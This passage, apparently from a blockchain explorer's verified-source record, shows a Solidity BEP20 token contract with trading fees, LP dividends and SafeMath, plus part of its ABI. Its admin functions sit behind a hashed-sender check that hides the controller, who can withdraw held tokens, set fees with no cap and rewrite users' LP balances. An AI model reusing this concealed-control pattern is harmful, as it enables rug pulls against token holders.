setSwitchDivid(bool num) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        switchDivid = num;\\r\\n    }\\r\\n\\r\\n    function setMinUsdtVals(uint256 num) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        minUsdtVal = num;\\r\\n    }\\r\\n\\r\\n    function setMinFenHongToken(uint256 num) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        minFenHongToken = num;\\r\\n    }\\r\\n\\r\\n    function setMinSwapNum(uint256 n1) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n\\r\\n        minSwapNum = n1;\\r\\n    }\\r\\n\\r\\n    function _basicTransfer(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) internal returns (bool) {\\r\\n        _balances[sender] = _balances[sender].sub(\\r\\n            amount,\\r\\n            \\\"Insufficient Balance\\\"\\r\\n        );\\r\\n        _balances[recipient] = _balances[recipient].add(amount);\\r\\n        emit Transfer(sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function swapAndLiquify() private lockTheSwap {\\r\\n        if (balanceOf(address(this)) \\u003e minSwapNum) {\\r\\n            uint256 amount = balanceOf(address(this));\\r\\n            swapTokensForUsdt(amount, _tokenDistributor);\\r\\n            uint256 usdtTotal = IBEP20(usdtAddress).balanceOf(\\r\\n                address(_tokenDistributor)\\r\\n            );\\r\\n            if (usdtTotal==0) return;\\r\\n            uint256 usdtToNFTAddress=_toNFT*usdtTotal/(_toNFT+_toMarket);\\r\\n            // uint256 usdtToNFTAddress = usdtNum_divi2.div(2);\\r\\n            // IBEP20(usdtAddress).transferFrom(address(_tokenDistributor), address(this),usdtDis);\\r\\n            _toNFT=0;\\r\\n            _toMarket=0;\\r\\n            TokenDistributor tokenDivite = TokenDistributor(_tokenDistributor);\\r\\n            if(usdtToNFTAddress\\u003e0)\\r\\n                tokenDivite.clamErcOther(\\r\\n                    usdtAddress,\\r\\n                    _NFTAddress,\\r\\n                    usdtToNFTAddress\\r\\n                );\\r\\n            if((usdtTotal-usdtToNFTAddress)\\u003e0)\\r\\n            tokenDivite.clamErcOther(\\r\\n                usdtAddress,\\r\\n                _marketAddress,\\r\\n                usdtTotal-usdtToNFTAddress\\r\\n            );\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function swapTokensForUsdt(uint256 tokenAmount, address recipient) private {\\r\\n        address[] memory path = new address[](2);\\r\\n        path[0] = address(this);\\r\\n        path[1] = address(usdtAddress);\\r\\n\\r\\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\\r\\n\\r\\n        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n            tokenAmount,\\r\\n            0, // accept any amount of ETH\\r\\n            path,\\r\\n            address(recipient),\\r\\n            block.timestamp\\r\\n        );\\r\\n    }\\r\\n\\r\\n    function process(uint256 gas) private lockTheSwap {\\r\\n        uint256 shareholderCount = shareholders.length;\\r\\n        if (shareholderCount == 0) return;\\r\\n\\r\\n        uint256 gasUsed = 0;\\r\\n        uint256 gasLeft = gasleft();\\r\\n        uint256 iterations = 0;\\r\\n        TokenDistributor tokenDivite = TokenDistributor(_tokenDistributor);\\r\\n        while (gasUsed \\u003c gas \\u0026\\u0026 iterations \\u003c shareholderCount) {\\r\\n            if (currentIndex \\u003e= shareholderCount) {\\r\\n                currentIndex = 0;\\r\\n                curPerFenhongVal = 0;\\r\\n\\r\\n                return;\\r\\n            }\\r\\n            (uint256 lpAmount, uint256 lpLockAmount, uint256 releaseAmount,) = getUserInfo(shareholders[currentIndex]);\\r\\n            uint256 amount =(lpAmount.add(releaseAmount).sub(lpLockAmount))\\r\\n                .mul(curPerFenhongVal)\\r\\n                .div(magnitude);\\r\\n            if (balanceOf(_tokenDistributor) \\u003c amount) {\\r\\n                currentIndex = 0;\\r\\n                curPerFenhongVal = 0;\\r\\n                return;\\r\\n            }\\r\\n            if (amount \\u003e 0)\\r\\n                tokenDivite.clamErcOther(\\r\\n                    address(this),\\r\\n                    shareholders[currentIndex],\\r\\n                    amount\\r\\n                );\\r\\n            // IBEP20(usdtAddress).transferFrom(address(_tokenDistributor),shareholders[currentIndex],amount);\\r\\n            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));\\r\\n            gasLeft = gasleft();\\r\\n            currentIndex++;\\r\\n            iterations++;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function takeFee(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) internal returns (uint256) {\\r\\n        uint256 feeAmount = 0;\\r\\n        uint256 marketFee = 0;\\r\\n        if (isMarketPair[sender] || isMarketPair[recipient]) {\\r\\n            feeAmount = amount.mul(_Fee).div(1000);\\r\\n            if (feeAmount \\u003e 0)\\r\\n                _takeFee(sender, address(_tokenDistributor), feeAmount);\\r\\n            marketFee = amount.mul(_MarketFee).div(1000);\\r\\n            if (marketFee \\u003e 0)\\r\\n                _takeFee(sender, address(this), marketFee);\\r\\n                _toMarket+=marketFee;\\r\\n        }\\r\\n        return amount.sub(feeAmount).sub(marketFee);\\r\\n    }\\r\\n\\r\\n    function _takeFee(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 tAmount\\r\\n    ) private {\\r\\n        if (tAmount == 0) return;\\r\\n        _balances[recipient] = _balances[recipient].add(tAmount);\\r\\n        emit Transfer(sender, recipient, tAmount);\\r\\n    }\\r\\n\\r\\n    function drawErcOther(\\r\\n        address erc,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        IBEP20(erc).transfer(recipient, amount);\\r\\n    }\\r\\n\\r\\n    function setFee(uint256 fee, uint256 mfee) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        _Fee = fee;\\r\\n        _MarketFee = mfee;\\r\\n    }\\r\\n\\r\\n    function setRouter(address router, bool key) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        isMarketPair[router] = key;\\r\\n    }\\r\\n\\r\\n\\r\\n    function setShare(address shareholder) private {\\r\\n        if (_updated[shareholder]) {\\r\\n            if (balanceOf(shareholder) \\u003c minFenHongToken)\\r\\n                quitShare(shareholder);\\r\\n            return;\\r\\n        }\\r\\n        if (balanceOf(shareholder) \\u003c minFenHongToken) return;\\r\\n        addShareholder(shareholder);\\r\\n        _updated[shareholder] = true;\\r\\n        addLPTime[shareholder] = block.timestamp;\\r\\n    }\\r\\n\\r\\n    function addShareholder(address shareholder) internal {\\r\\n        shareholderIndexes[shareholder] = shareholders.length;\\r\\n        shareholders.push(shareholder);\\r\\n    }\\r\\n\\r\\n    function quitShare(address shareholder) private {\\r\\n        removeShareholder(shareholder);\\r\\n        _updated[shareholder] = false;\\r\\n    }\\r\\n\\r\\n    function removeShareholder(address shareholder) internal {\\r\\n        shareholders[shareholderIndexes[shareholder]] = shareholders[\\r\\n            shareholders.length - 1\\r\\n        ];\\r\\n        shareholderIndexes[\\r\\n            shareholders[shareholders.length - 1]\\r\\n        ] = shareholderIndexes[shareholder];\\r\\n        shareholders.pop();\\r\\n    }\\r\\n    function setDailyDuration(uint256 d) external  {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        _releaseLPDailyDuration = d;\\r\\n    }\\r\\n\\r\\n    function setReleaseLPDailyRate(uint256 rate) external {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        _releaseLPDailyRate = rate;\\r\\n    }\\r\\n    function updateLPAmount(address account, uint256 newlpAmount) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n\\r\\n        LPAmount[account] = newlpAmount;\\r\\n    }\\r\\n\\r\\n    function updateLPLockAmount(address account, uint256 newlockAmount) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        lockLPAmount[account] = newlockAmount;\\r\\n    }\\r\\n\\r\\n    function initLPLockAmounts(address[] memory accounts, uint256 lpAmount)\\r\\n        public\\r\\n    {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        uint256 len = accounts.length;\\r\\n\\r\\n        for (uint256 i; i \\u003c len; ) {\\r\\n            LPAmount[accounts[i]] = lpAmount;\\r\\n            lockLPAmount[accounts[i]] = lpAmount;\\r\\n            unchecked {\\r\\n                ++i;\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function getUserInfo(address account) public view returns (\\r\\n        uint256 lpAmount, uint256 lpLockAmount, uint256 releaseAmount, uint256 lpBalance\\r\\n    ) {\\r\\n        // UserInfo storage userInfo = _userInfo[account];\\r\\n        lpAmount = LPAmount[account];\\r\\n\\r\\n        lpLockAmount = lockLPAmount[account];\\r\\n        if (_releaseLPStartTime \\u003e 0) {\\r\\n            uint256 times = (block.timestamp - _releaseLPStartTime) / _releaseLPDailyDuration;\\r\\n            releaseAmount = lpLockAmount * (1 + times) * _releaseLPDailyRate / 10000;\\r\\n            if (releaseAmount \\u003e lpLockAmount) {\\r\\n                releaseAmount = lpLockAmount;\\r\\n            }\\r\\n        }\\r\\n        lpBalance = IBEP20(uniswapPair).balanceOf(account);\\r\\n    }\\r\\n    function initSendLPAmounts(address[] memory accounts, uint256 lpAmount)\\r\\n        public\\r\\n    {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        uint256 len = accounts.length;\\r\\n\\r\\n        for (uint256 i; i \\u003c len; ) {\\r\\n            LPAmount[accounts[i]] = lpAmount;\\r\\n            lockLPAmount[accounts[i]] = lpAmount;\\r\\n            IBEP20(uniswapPair).transfer(accounts[i],lpAmount);\\r\\n            unchecked {\\r\\n                ++i;\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n    function _isAddLiquidity(uint256 amount)\\r\\n        internal\\r\\n        view\\r\\n        returns (uint256 liquidity)\\r\\n    {\\r\\n        (uint256 rOther, uint256 rThis, uint256 balanceOther) = _getReserves();\\r\\n        uint256 amountOther;\\r\\n        if (rOther \\u003e 0 \\u0026\\u0026 rThis \\u003e 0) {\\r\\n            amountOther = (amount * rOther) / rThis;\\r\\n        }\\r\\n        //isAddLP\\r\\n        if (balanceOther \\u003e= rOther + amountOther) {\\r\\n            (liquidity, ) = calLiquidity(balanceOther, amount, rOther, rThis);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function calLiquidity(\\r\\n        uint256 balanceA,\\r\\n        uint256 amount,\\r\\n        uint256 r0,\\r\\n        uint256 r1\\r\\n    ) private view returns (uint256 liquidity, uint256 feeToLiquidity) {\\r\\n        uint256 pairTotalSupply = IUniswapV2Pair(uniswapPair).totalSupply();\\r\\n        address feeTo = IUniswapV2Factory(uniswapV2Router.factory()).feeTo();\\r\\n        bool feeOn = feeTo != address(0);\\r\\n        uint256 _kLast = IUniswapV2Pair(uniswapPair).kLast();\\r\\n        if (feeOn) {\\r\\n            if (_kLast != 0) {\\r\\n                uint256 rootK = Math.sqrt(r0 * r1);\\r\\n                uint256 rootKLast = Math.sqrt(_kLast);\\r\\n                if (rootK \\u003e rootKLast) {\\r\\n                    uint256 numerator = pairTotalSupply *\\r\\n                        (rootK - rootKLast) *\\r\\n                        8;\\r\\n                    uint256 denominator = rootK * 17 + (rootKLast * 8);\\r\\n                    feeToLiquidity = numerator / denominator;\\r\\n                    if (feeToLiquidity \\u003e 0) pairTotalSupply += feeToLiquidity;\\r\\n                }\\r\\n            }\\r\\n        }\\r\\n        uint256 amount0 = balanceA - r0;\\r\\n        if (pairTotalSupply == 0) {\\r\\n            liquidity = Math.sqrt(amount0 * amount) - 1000;\\r\\n        } else {\\r\\n            liquidity = Math.min(\\r\\n                (amount0 * pairTotalSupply) / r0,\\r\\n                (amount * pairTotalSupply) / r1\\r\\n            );\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function _getReserves()\\r\\n        public\\r\\n        view\\r\\n        returns (\\r\\n            uint256 rOther,\\r\\n            uint256 rThis,\\r\\n            uint256 balanceOther\\r\\n        )\\r\\n    {\\r\\n        IUniswapV2Pair mainPair = IUniswapV2Pair(uniswapPair);\\r\\n        (uint256 r0, uint256 r1, ) = mainPair.getReserves();\\r\\n\\r\\n        address tokenOther = usdtAddress;\\r\\n        if (tokenOther \\u003c address(this)) {\\r\\n            rOther = r0;\\r\\n            rThis = r1;\\r\\n        } else {\\r\\n            rOther = r1;\\r\\n            rThis = r0;\\r\\n        }\\r\\n\\r\\n        balanceOther = IBEP20(tokenOther).balanceOf(uniswapPair);\\r\\n    }\\r\\n\\r\\n    function _isRemoveLiquidity(uint256 amount)\\r\\n        internal\\r\\n        view\\r\\n        returns (uint256 liquidity)\\r\\n    {\\r\\n        (uint256 rOther, , uint256 balanceOther) = _getReserves();\\r\\n        //isRemoveLP\\r\\n        if (balanceOther \\u003c= rOther) {\\r\\n            liquidity =\\r\\n                (amount * IUniswapV2Pair(uniswapPair).totalSupply() + 1) /\\r\\n                (balanceOf(uniswapPair) - amount - 1);\\r\\n        }\\r\\n    }\\r\\n}\\r\\n\"},\"SafeMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\n\\r\\npragma solidity \\u003e=0.8.0;\\r\\n\\r\\n/**\\r\\n * @dev Wrappers over Solidity\\u0027s arithmetic operations with added overflow\\r\\n * checks.\\r\\n *\\r\\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\\r\\n * in bugs, because programmers usually assume that an overflow raises an\\r\\n * error, which is the standard behavior in high level programming languages.\\r\\n * `SafeMath` restores this intuition by reverting the transaction when an\\r\\n * operation overflows.\\r\\n *\\r\\n * Using this library instead of the unchecked operations eliminates an entire\\r\\n * class of bugs, so it\\u0027s recommended to use it always.\\r\\n */\\r\\nlibrary SafeMath {\\r\\n    /**\\r\\n     * @dev Returns the addition of two unsigned integers, reverting on\\r\\n     * overflow.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `+` operator.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - Addition cannot overflow.\\r\\n     */\\r\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        uint256 c = a + b;\\r\\n        require(c \\u003e= a, \\u0027SafeMath: addition overflow\\u0027);\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the subtraction of two unsigned integers, reverting on\\r\\n     * overflow (when the result is negative).\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `-` operator.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - Subtraction cannot overflow.\\r\\n     */\\r\\n    function subwithlesszero(uint256 a,uint256 b) internal pure returns (uint256)\\r\\n    {\\r\\n        if(b\\u003ea)\\r\\n            return 0;\\r\\n        else\\r\\n            return a-b;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the subtraction of two unsigned integers, reverting on\\r\\n     * overflow (when the result is negative).\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `-` operator.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - Subtraction cannot overflow.\\r\\n     */\\r\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return sub(a, b, \\u0027SafeMath: subtraction overflow\\u0027);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\\r\\n     * overflow (when the result is negative).\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `-` operator.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - Subtraction cannot overflow.\\r\\n     */\\r\\n    function sub(\\r\\n        uint256 a,\\r\\n        uint256 b,\\r\\n        string memory errorMessage\\r\\n    ) internal pure returns (uint256) {\\r\\n        require(b \\u003c= a, errorMessage);\\r\\n        uint256 c = a - b;\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the multiplication of two unsigned integers, reverting on\\r\\n     * overflow.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `*` operator.\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - Multiplication cannot overflow.\\r\\n     */\\r\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        // Gas optimization: this is cheaper than requiring \\u0027a\\u0027 not being zero, but the\\r\\n        // benefit is lost if \\u0027b\\u0027 is also tested.\\r\\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\r\\n        if (a == 0) {\\r\\n            return 0;\\r\\n        }\\r\\n\\r\\n        uint256 c = a * b;\\r\\n        require(c / a == b, \\u0027SafeMath: multiplication overflow\\u0027);\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the integer division of two unsigned integers. Reverts on\\r\\n     * division by zero. The result is rounded towards zero.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `/` operator. Note: this function uses a\\r\\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\\r\\n     * uses an invalid opcode to revert (consuming all remaining gas).\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - The divisor cannot be zero.\\r\\n     */\\r\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return div(a, b, \\u0027SafeMath: division by zero\\u0027);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\\r\\n     * division by zero. The result is rounded towards zero.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `/` operator. Note: this function uses a\\r\\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\\r\\n     * uses an invalid opcode to revert (consuming all remaining gas).\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - The divisor cannot be zero.\\r\\n     */\\r\\n    function div(\\r\\n        uint256 a,\\r\\n        uint256 b,\\r\\n        string memory errorMessage\\r\\n    ) internal pure returns (uint256) {\\r\\n        require(b \\u003e 0, errorMessage);\\r\\n        uint256 c = a / b;\\r\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\\u0027t hold\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\r\\n     * Reverts when dividing by zero.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `%` operator. This function uses a `revert`\\r\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\r\\n     * invalid opcode to revert (consuming all remaining gas).\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - The divisor cannot be zero.\\r\\n     */\\r\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return mod(a, b, \\u0027SafeMath: modulo by zero\\u0027);\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\\r\\n     * Reverts with custom message when dividing by zero.\\r\\n     *\\r\\n     * Counterpart to Solidity\\u0027s `%` operator. This function uses a `revert`\\r\\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\\r\\n     * invalid opcode to revert (consuming all remaining gas).\\r\\n     *\\r\\n     * Requirements:\\r\\n     *\\r\\n     * - The divisor cannot be zero.\\r\\n     */\\r\\n    function mod(\\r\\n        uint256 a,\\r\\n        uint256 b,\\r\\n        string memory errorMessage\\r\\n    ) internal pure returns (uint256) {\\r\\n        require(b != 0, errorMessage);\\r\\n        return a % b;\\r\\n    }\\r\\n\\r\\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\\r\\n        z = x \\u003c y ? x : y;\\r\\n    }\\r\\n\\r\\n    // babylonian method (https://en.wikipedia.org/wiki/Methods_of_computing_square_roots#Babylonian_method)\\r\\n    function sqrt(uint256 y) internal pure returns (uint256 z) {\\r\\n        if (y \\u003e 3) {\\r\\n            z = y;\\r\\n            uint256 x = y / 2 + 1;\\r\\n            while (x \\u003c z) {\\r\\n                z = x;\\r\\n                x = (y / x + x) / 2;\\r\\n            }\\r\\n        } else if (y != 0) {\\r\\n            z = 1;\\r\\n        }\\r\\n    }\\r\\n}\\r\\n\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"LPAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_NFTAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_deadAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_getReserves\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"rOther\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"rThis\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"balanceOther\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_marketAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_releaseLPDailyDuration\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_releaseLPDailyRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_releaseLPStartTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_startTradeTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_toMarket\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_toNFT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_userHoldPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"addLPTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burn\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"burnFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"curPerFenhongVal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currentIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"distributorGas\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"erc\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"drawErcOther\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCurrentPrice\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"currentprice\",\"type\":\"uint256\"}],\"name\":\"getCutCount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getUserInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"lpAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lpLockAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"releaseAmount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lpBalance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"lpAmount\",\"type\":\"uint256\"}],\"name\":\"initLPLockAmounts\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"lpAmount\",\"type\":\"uint256\"}],\"name\":\"initSendLPAmounts\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isContract\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\